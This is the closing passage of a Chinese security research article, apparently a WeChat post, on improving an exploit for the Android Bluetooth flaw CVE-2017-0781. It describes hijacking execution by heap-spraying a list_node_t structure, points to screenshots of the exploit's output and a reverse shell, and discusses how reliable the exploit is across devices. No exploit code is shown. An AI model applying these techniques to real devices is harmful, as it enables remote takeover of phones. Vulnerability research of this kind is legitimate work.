234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体，然后转换为<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">p_msg</code>参数传递到<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btu_hci_msg_process</code>函数进行处理。因此，只要能够控制堆上的<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体，就能够在<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">btu_hci_msg_process</code>函数执行时劫持进程。armis的exploit也是通过大量堆喷去实现覆盖<code style="font-size: 0.85em;font-family: Consolas, Inconsolata, Courier, monospace;margin-right: 0.15em;margin-left: 0.15em;padding-right: 0.3em;padding-left: 0.3em;white-space: pre-wrap;border-width: 1px;border-style: solid;border-color: rgb(234, 234, 234);background-color: rgb(248, 248, 248);border-radius: 3px;display: inline;">list_node_t</code>结构体。</p><p style="margin-bottom: 1.2em !important;">armis的exploit运行结果如下所示：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhpWibzNuZkpQ67B6ADtkic0w8Vm4X3R7X5VicwhdWyLqlSxEytdUyJqkkA/0?wx_fmt=png" class="" data-ratio="0.5321100917431193" data-w="1308" data-type="png" src="../Images/02362f033668c8bd9e79f5dc73bb19ce.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhpWibzNuZkpQ67B6ADtkic0w8Vm4X3R7X5VicwhdWyLqlSxEytdUyJqkkA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">反弹shell如下：</p><p style="margin-bottom: 1.2em !important;"><img data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhrU8uRokk3P88sf4sTLubo0y0icSO6mxkEEglbk3VBjjich6Gmz7da1JA/0?wx_fmt=png" class="" data-ratio="0.5942857142857143" data-w="1400" data-type="png" src="../Images/8979308b0a2b9030449dee64865cba3b.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIrTSx4rQlibuicWjDiaZQVKTIhrU8uRokk3P88sf4sTLubo0y0icSO6mxkEEglbk3VBjjich6Gmz7da1JA/0?wx_fmt=png"/></p><p style="margin-bottom: 1.2em !important;">armis的exploit在基址和偏移量准确的情况下，成功利用的概率很高，而且十分稳定。</p><h2 style="margin-top: 1.3em;margin-bottom: 1em;font-weight: bold;font-size: 1.4em;border-bottom: 1px solid rgb(238, 238, 238);">0x04 总结</h2><p style="margin-bottom: 1.2em !important;">本文介绍了针对CVE-2017-0781的exploit优化思路及过程，提高了稳定性及成功率。我们也尝试了在release版本的手机上进行测试，目前暂时只在nexus
+ 6p + 
+google工厂镜像上测试成功，在其他机型上暂未成功。由于不同oem厂商对系统均有所改动，且release版本手机不好调试及找寻找符号偏移量，所以适配工作还是有一定难度，大规模通杀的exploit更是难上加难。</p><section class="" data-tools="135&#x7F16;&#x8F91;&#x5668;" data-id="86357" style="max-width: 100%;box-sizing: border-box;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;border-width: 0px;border-style: none;border-color: initial;word-wrap: break-word !important;"><section style="max-width: 100%;text-align: center;box-sizing: border-box !important;word-wrap: break-word !important;"><section style="display: inline-block;max-width: 100%;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><section class="" data-tools="135编辑器" data-id="86357" style="max-width: 100%;box-sizing: border-box;border-width: 0px;border-style: none;border-color: initial;word-wrap: break-word !important;"><section style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"><p style="max-width: 100%;min-height: 1em;display: inline-block;width: 192px;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.125" data-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?" data-type="png" data-w="600" style="display: inline;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: 192px !important;" title="墨迹晕染分割线" width="192px" src="../Images/c96a1b435221f7e6cf4c4e3eca199d9e.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZmbX5NFgic65Bo4SIYUK4ib9ibvpyoaPJibpkS2Q8Q24DicBfEtnh6xBcFSw/640.png?"/></p></section></section></section></section></section><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;"><br style="max-width: 100%;box-sizing: border-box !important;word-wrap: break-word !important;"/></p><p style="max-width: 100%;min-height: 1em;color: rgb(62, 62, 62);font-size: 16px;white-space: normal;background-color: rgb(255, 255, 255);line-height: 25.6px;font-family: &#x5FAE;&#x8F6F;&#x96C5;&#x9ED1;;box-sizing: border-box !important;word-wrap: break-word !important;"><img class="" data-ratio="0.3036773428232503" data-s="300,640" data-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?" data-type="jpeg" data-w="843" style="line-height: 25.6px;box-sizing: border-box !important;word-wrap: break-word !important;visibility: visible !important;width: auto !important;" width="auto" src="../Images/4f6f4b18070490b9670250379d20693d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_jpg/fwNqC4xHXIoEGQVnQojUKQ4J1WMicVDoZ0Y7FsbxeE68njy7pfZf9hstOTLqPHS1uljxrnicvns89MRJ7DMQowOg/640.jpeg?"/></p>
+        
+</body>
+</html>
